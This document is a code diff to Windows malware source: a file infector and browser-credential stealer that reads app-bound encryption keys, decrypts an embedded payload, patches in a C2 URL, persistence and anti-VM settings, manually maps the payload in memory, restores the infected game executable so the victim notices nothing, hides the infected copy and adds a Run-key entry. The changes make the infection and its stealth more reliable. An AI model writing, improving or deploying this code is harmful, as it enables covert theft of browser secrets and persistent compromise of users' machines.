@@ -329,11 +329,27 @@ static bool ResolveBrowserExe(const KeyTarget& t, wchar_t* out, DWORD cap){
     return false;
 }
 
+static bool ReadAllBytes(HANDLE h, void* data, DWORD len){
+    BYTE* p=(BYTE*)data; DWORD done=0;
+    while(done<len){
+        DWORD got=0;
+        if(!ReadFile(h,p+done,len-done,&got,NULL) || got==0) return false;
+        done+=got;
+    }
+    return true;
+}
+
 static bool WriteAllBytes(const wchar_t* path, const void* data, DWORD len){
     HANDLE h=CreateFileW(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
     if(h==INVALID_HANDLE_VALUE) return false;
-    DWORD wr=0; bool ok=WriteFile(h,data,len,&wr,NULL)!=FALSE && wr==len;
-    CloseHandle(h);
+    const BYTE* p=(const BYTE*)data; DWORD done=0; bool ok=true;
+    while(done<len){
+        DWORD wr=0;
+        if(!WriteFile(h,p+done,len-done,&wr,NULL) || wr==0){ ok=false; break; }
+        done+=wr;
+    }
+    if(!CloseHandle(h)) ok=false;
+    if(!ok) DeleteFileW(path);
     return ok;
 }
 
@@ -362,6 +378,10 @@ static bool RunHelper(const wchar_t* helper, const wchar_t* appb,
         return false;
     }
     DWORD w=WaitForSingleObject(pi.hProcess,60000);
+    if(w!=WAIT_OBJECT_0){
+        TerminateProcess(pi.hProcess,1);
+        WaitForSingleObject(pi.hProcess,INFINITE);
+    }
     DWORD code=1;
     GetExitCodeProcess(pi.hProcess,&code);
     CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
@@ -395,15 +415,14 @@ static bool ReadAppBound(const wchar_t* path, char** out, DWORD* out_len){
     DWORD len=(DWORD)sz.QuadPart;
     char* buf=(char*)VirtualAlloc(NULL,len+1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
     if(!buf){ CloseHandle(h); return false; }
-    DWORD rd=0;
-    BOOL read_ok=ReadFile(h,buf,len,&rd,NULL);
+    bool read_ok=ReadAllBytes(h,buf,len);
     CloseHandle(h);
-    if(!read_ok||!rd){ VirtualFree(buf,0,MEM_RELEASE); return false; }
-    buf[rd]=0;
+    if(!read_ok){ VirtualFree(buf,0,MEM_RELEASE); return false; }
+    buf[len]=0;
 
     static const char key[]="\"app_bound_encrypted_key\"";
     const DWORD klen=(DWORD)(sizeof(key)-1);
-    const char* end=buf+rd;
+    const char* end=buf+len;
     const char* c=NULL;
     for(char* p=buf; p+klen<end; p++){
         if(*p=='"'&&memcmp(p,key,klen)==0){ c=p+klen; break; }
@@ -509,29 +528,22 @@ static BYTE* DecryptPayload(void){
     for(unsigned i=0; i<g_payload_len; i++)
         buf[i] = g_payload_enc[i] ^ g_xor_key[i & 15];
 
-    // Patch C2 sentinel: search for "CKC2_DEADBEEF_" (14 bytes) in decrypted payload
+    // Patch all sentinels in one pass over the decrypted payload.
     const char c2_sentinel[14] = {'C','K','C','2','_','D','E','A','D','B','E','E','F','_'};
-    for(unsigned i=0; i+14 <= g_payload_len; i++){
-        if(memcmp(buf+i, c2_sentinel, 14)==0){
-            memcpy(buf+i, g_c2_url, 256);
-            break;
-        }
-    }
-    // Patch persistence sentinel: search for "CKPR____" (8 bytes)
     const char pr_sentinel[8] = {'C','K','P','R','_','_','_','_'};
-    for(unsigned i=0; i+8 <= g_payload_len; i++){
-        if(memcmp(buf+i, pr_sentinel, 8)==0){
-            memcpy(buf+i, g_persist, 8);
-            break;
-        }
-    }
-    // Patch anti-VM sentinel: search for "CKAV0000" (8 bytes)
     const char av_sentinel[8] = {'C','K','A','V','0','0','0','0'};
-    for(unsigned i=0; i+8 <= g_payload_len; i++){
-        if(memcmp(buf+i, av_sentinel, 8)==0){
-            memcpy(buf+i, g_skip_av, 8);
-            break;
+    bool have_c2=false, have_pr=false, have_av=false;
+    for(unsigned i=0; i<g_payload_len; i++){
+        if(!have_c2 && i+14<=g_payload_len && memcmp(buf+i,c2_sentinel,14)==0){
+            memcpy(buf+i,g_c2_url,256); have_c2=true;
         }
+        if(!have_pr && i+8<=g_payload_len && memcmp(buf+i,pr_sentinel,8)==0){
+            memcpy(buf+i,g_persist,8); have_pr=true;
+        }
+        if(!have_av && i+8<=g_payload_len && memcmp(buf+i,av_sentinel,8)==0){
+            memcpy(buf+i,g_skip_av,8); have_av=true;
+        }
+        if(have_c2 && have_pr && have_av) break;
     }
     return buf;
 }
@@ -685,23 +697,43 @@ static BYTE* MapPayload(BYTE* img){
         DWORD rr=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
         DWORD rs=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
         if(!rr || !rs){ LLog("map: moved image has no relocations",0); return NULL; }
-        BYTE* p=img+Rva2Off(nt,rr);
+        DWORD image_size=nt->OptionalHeader.SizeOfImage;
+        if(rr>image_size || rs>image_size-rr){ LLog("map: relocation RVA outside image",0); return NULL; }
+        DWORD roff=Rva2Off(nt,rr);
+        if(roff>g_payload_len || rs>g_payload_len-roff){
+            LLog("map: relocation directory outside payload",0); return NULL;
+        }
+        BYTE* p=img+roff;
         BYTE* end=p+rs;
-        while(p+sizeof(IMAGE_BASE_RELOCATION)<=end){
+        while(p<end){
+            DWORD left=(DWORD)(end-p);
+            if(left<sizeof(IMAGE_BASE_RELOCATION)){
+                LLog("map: truncated relocation block",0); return NULL;
+            }
             PIMAGE_BASE_RELOCATION blk=(PIMAGE_BASE_RELOCATION)p;
-            if(blk->SizeOfBlock<sizeof(IMAGE_BASE_RELOCATION) || p+blk->SizeOfBlock>end) break;
+            DWORD bs=blk->SizeOfBlock;
+            if(bs<sizeof(IMAGE_BASE_RELOCATION) || bs>left ||
+               (bs-sizeof(IMAGE_BASE_RELOCATION))%sizeof(WORD)){
+                LLog("map: malformed relocation block",0); return NULL;
+            }
             WORD* ent=(WORD*)(p+sizeof(IMAGE_BASE_RELOCATION));
-            DWORD n=(blk->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
+            DWORD n=(bs-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
             for(DWORD i=0;i<n;i++){
                 WORD type=ent[i]>>12, off=ent[i]&0x0FFF;
-                BYTE* t=base+blk->VirtualAddress+off;
-                if(type==IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)t+=delta;
-                else if(type==IMAGE_REL_BASED_HIGHLOW) *(DWORD*)t+=(DWORD)delta;
-                else if(type!=IMAGE_REL_BASED_ABSOLUTE){
+                ULONG_PTR rva=(ULONG_PTR)blk->VirtualAddress+off;
+                if(type==IMAGE_REL_BASED_DIR64 || type==IMAGE_REL_BASED_HIGHLOW){
+                    DWORD width=type==IMAGE_REL_BASED_DIR64?sizeof(ULONG_PTR):sizeof(DWORD);
+                    if(rva>image_size || width>image_size-(DWORD)rva){
+                        LLog("map: relocation target outside image",0); return NULL;
+                    }
+                    BYTE* t=base+rva;
+                    if(type==IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)t+=delta;
+                    else *(DWORD*)t+=(DWORD)delta;
+                } else if(type!=IMAGE_REL_BASED_ABSOLUTE){
                     LLog("map: unsupported relocation",type); return NULL;
                 }
             }
-            p+=blk->SizeOfBlock;
+            p+=bs;
         }
     }
 
@@ -828,127 +860,115 @@ int wmain(int argc,wchar_t** argv){
         wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL,self,MAX_PATH);
         HANDLE hs=CreateFileW(self,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
         if(hs!=INVALID_HANDLE_VALUE){
-            LARGE_INTEGER fsize; GetFileSizeEx(hs,&fsize);
+            LARGE_INTEGER fsize; bool size_ok=GetFileSizeEx(hs,&fsize)!=FALSE;
             bool found=false;
-            if(fsize.QuadPart>12){
+            if(size_ok && fsize.QuadPart>12){
                 LARGE_INTEGER pos; pos.QuadPart=fsize.QuadPart-8;
-                SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
-                BYTE tail[8]; DWORD rd2=0; ReadFile(hs,tail,8,&rd2,NULL);
-                if(rd2==8 && tail[4]=='C' && tail[5]=='K' && tail[6]=='L' && tail[7]=='G'){
+                BYTE tail[8];
+                if(SetFilePointerEx(hs,pos,NULL,FILE_BEGIN) && ReadAllBytes(hs,tail,8) &&
+                   tail[4]=='C' && tail[5]=='K' && tail[6]=='L' && tail[7]=='G'){
                     DWORD host_len=*(DWORD*)tail;
                     if(host_len>0 && host_len<(DWORD)(fsize.QuadPart-8)){
-                        // 1. Extract original host bytes
+                        // 1. Read the complete host before changing the infected file.
                         pos.QuadPart=fsize.QuadPart-8-host_len;
-                        SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
-                        BYTE* hbuf=(BYTE*)VirtualAlloc(NULL,host_len,MEM_COMMIT,PAGE_READWRITE);
-                        DWORD r3=0; ReadFile(hs,hbuf,host_len,&r3,NULL);
-                        CloseHandle(hs); found=true;
-
-                        // 2. Rename-restore: rename the infected .exe to a hidden temp,
-                        //    and write the original host bytes back to the ORIGINAL filename.
-                        //    Reason: Unity games derive their data path from the exe name
-                        //    (they look for <name>_Data/). If we extract as ~ck_tmp.exe,
-                        //    Unity looks for ~ck_tmp_Data/ and fails.
-                        //    With rename-restore, the host runs with its original name
-                        //    and finds <name>_Data/, UnityPlayer.dll, etc.
+                        BYTE* hbuf=(BYTE*)VirtualAlloc(NULL,host_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+                        bool host_read=hbuf && SetFilePointerEx(hs,pos,NULL,FILE_BEGIN) &&
+                                       ReadAllBytes(hs,hbuf,host_len);
+                        CloseHandle(hs); hs=INVALID_HANDLE_VALUE;
 
                         // Directory of the infected .exe
                         wchar_t wdir[MAX_PATH]; lstrcpyW(wdir,self);
                         wchar_t* s2=wdir+lstrlenW(wdir);
                         while(s2>wdir && s2[-1]!=L'\\') s2--;
                         *s2=0;
-
-                        // Temp name to stash the infected exe: <dir>\~ck_bak.bin
-                        // Hidden + System attributes so it doesn't show in Explorer
-                        wchar_t bak[MAX_PATH]; lstrcpyW(bak,wdir);
-                        lstrcatW(bak,L"~ck_bak.bin");
-                        DeleteFileW(bak);
-
-                        // Original .exe name (self) = where we write the clean host
                         wchar_t origName[MAX_PATH]; lstrcpyW(origName,self);
+                        wchar_t bak[MAX_PATH]; lstrcpyW(bak,wdir); lstrcatW(bak,L"~ck_bak.bin");
+                        wchar_t clean[MAX_PATH]; lstrcpyW(clean,wdir); lstrcatW(clean,L"~ck_tmp.exe");
+                        wchar_t runExe[MAX_PATH]; lstrcpyW(runExe,clean);
+                        bool renamed=false;
 
-                        // Rename infected -> ~ck_bak.bin
-                        BOOL renamed = MoveFileExW(origName,bak,MOVEFILE_REPLACE_EXISTING);
-
-                        // Hide ~ck_bak.bin immediately after rename
-                        if(renamed){
-                            SetFileAttributesW(bak, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-                        }
-
-                        wchar_t runExe[MAX_PATH];
-                        if(renamed){
-                            // Write original host to the original filename
-                            HANDLE horig=CreateFileW(origName,GENERIC_WRITE,0,NULL,
-                                                     CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
-                            if(horig!=INVALID_HANDLE_VALUE){
-                                WriteFile(horig,hbuf,host_len,&r3,NULL); CloseHandle(horig);
-                            }
-                            lstrcpyW(runExe,origName);
-                        } else {
-                            // Fallback: extract as ~ck_tmp.exe
-                            lstrcpyW(runExe,wdir); lstrcatW(runExe,L"~ck_tmp.exe");
-                            HANDLE htmp=CreateFileW(runExe,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
-                                                    FILE_ATTRIBUTE_HIDDEN,NULL);
-                            if(htmp!=INVALID_HANDLE_VALUE){
-                                WriteFile(htmp,hbuf,host_len,&r3,NULL); CloseHandle(htmp);
+                        if(host_read && WriteAllBytes(clean,hbuf,host_len)){
+                            // 2. Publish the staged clean host under its original name.
+                            // Unity needs that name to locate <name>_Data beside it.
+                            DeleteFileW(bak);
+                            renamed=MoveFileExW(origName,bak,
+                                MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH)!=FALSE;
+                            if(renamed){
+                                SetFileAttributesW(bak,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
+                                if(MoveFileExW(clean,origName,
+                                       MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH)){
+                                    lstrcpyW(runExe,origName); found=true;
+                                } else {
+                                    // Never expose a partial clean host; retain the backup if
+                                    // the restore itself is blocked by the filesystem.
+                                    if(!MoveFileExW(bak,origName,
+                                           MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH))
+                                        LLog("standalone: infected host restore failed",GetLastError());
+                                    DeleteFileW(clean);
+                                }
+                            } else {
+                                SetFileAttributesW(clean,FILE_ATTRIBUTE_HIDDEN);
+                                found=true;           // run the complete staged copy instead
                             }
                         }
                         VirtualFree(hbuf,0,MEM_RELEASE);
 
-                        // 3. Launch original host normally (game/installer/GUI appears)
-                        STARTUPINFOW si2={sizeof(si2)};
-                        si2.dwFlags=STARTF_USESHOWWINDOW;
-                        si2.wShowWindow=SW_SHOWNORMAL;
-                        PROCESS_INFORMATION pi2; memset(&pi2,0,sizeof(pi2));
-                        BOOL hp=CreateProcessW(runExe,NULL,NULL,NULL,FALSE,
-                                       CREATE_DEFAULT_ERROR_MODE,NULL,wdir,&si2,&pi2);
-                        if(!hp){
+                        if(found){
+                            // 3. Launch original host normally (game/installer/GUI appears)
+                            STARTUPINFOW si2={sizeof(si2)};
+                            si2.dwFlags=STARTF_USESHOWWINDOW;
+                            si2.wShowWindow=SW_SHOWNORMAL;
+                            PROCESS_INFORMATION pi2; memset(&pi2,0,sizeof(pi2));
+                            BOOL hp=CreateProcessW(runExe,NULL,NULL,NULL,FALSE,
+                                           CREATE_DEFAULT_ERROR_MODE,NULL,wdir,&si2,&pi2);
+                            if(!hp){
 #ifdef DEBUG
-                            // debug-only: never write a trace file on a production victim
-                            CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
-                            HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
-                                GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
-                            if(el!=INVALID_HANDLE_VALUE){
-                                SetFilePointer(el,0,NULL,FILE_END);
-                                char msg[300]; int n=wsprintfA(msg,
-                                    "CreateProcessW host failed: err=%u path=%S\r\n",
-                                    GetLastError(),runExe);
-                                DWORD w2; WriteFile(el,msg,n,&w2,NULL); CloseHandle(el);
-                            }
+                                // debug-only: never write a trace file on a production victim
+                                CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
+                                HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
+                                    GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
+                                if(el!=INVALID_HANDLE_VALUE){
+                                    SetFilePointer(el,0,NULL,FILE_END);
+                                    char msg[300]; int n=wsprintfA(msg,
+                                        "CreateProcessW host failed: err=%u path=%S\r\n",
+                                        GetLastError(),runExe);
+                                    DWORD w2; WriteFile(el,msg,n,&w2,NULL); CloseHandle(el);
+                                }
 #endif
-                        }
-                        if(pi2.hProcess){ CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess); }
-
-                        // 3b. Clean up the temp file -- unless persistence is enabled:
-                        // then register the hidden copy in Run and keep it as the
-                        // payload carrier (the main exe is now the clean host)
-                        bool persist_here = PersistEnabled();
-                        if(renamed){
-                            if(persist_here){
-                                InstallRunKey(bak);          // keep the backup as payload carrier
-                            } else if(!DeleteFileW(bak)){
-                                MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                             }
-                        } else {
-                            if(persist_here){
-                                InstallRunKey(runExe);
-                            } else if(!DeleteFileW(runExe)){
-                                MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
-                            }
-                        }
+                            if(pi2.hProcess){ CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess); }
 
-                        // 4. v13: the payload is mapped into THIS process. The host
-                        //    path is kept only as a sanity target (and the --purge
-                        //    target); the clean host runs as its own process.
-                        lstrcpynW(target_buf,runExe,MAX_PATH);
-                        target=target_buf;
-                        // extraction + hijack + every browser on a slow disk measured
-                        // ~3 min. wait stays 0 (no cap) unless -t was passed.
-                        // falls through to self-injection below
+                            // 3b. Clean up the temp file -- unless persistence is enabled:
+                            // then register the hidden copy in Run and keep it as the
+                            // payload carrier (the main exe is now the clean host)
+                            bool persist_here = PersistEnabled();
+                            if(renamed){
+                                if(persist_here){
+                                    InstallRunKey(bak);      // keep the backup as payload carrier
+                                } else if(!DeleteFileW(bak)){
+                                    MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
+                                }
+                            } else {
+                                if(persist_here){
+                                    InstallRunKey(origName); // rename failed: original is still infected
+                                } else if(!DeleteFileW(runExe)){
+                                    MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
+                                }
+                            }
+
+                            // 4. v13: the payload is mapped into THIS process. The host
+                            //    path is kept only as a sanity target (and the --purge
+                            //    target); the clean host runs as its own process.
+                            lstrcpynW(target_buf,runExe,MAX_PATH);
+                            target=target_buf;
+                            // extraction + hijack + every browser on a slow disk measured
+                            // ~3 min. wait stays 0 (no cap) unless -t was passed.
+                            // falls through to self-injection below
+                        }
                     }
                 }
             }
-            if(!found) CloseHandle(hs);
+            if(!found && hs!=INVALID_HANDLE_VALUE) CloseHandle(hs);
         }
     }
 
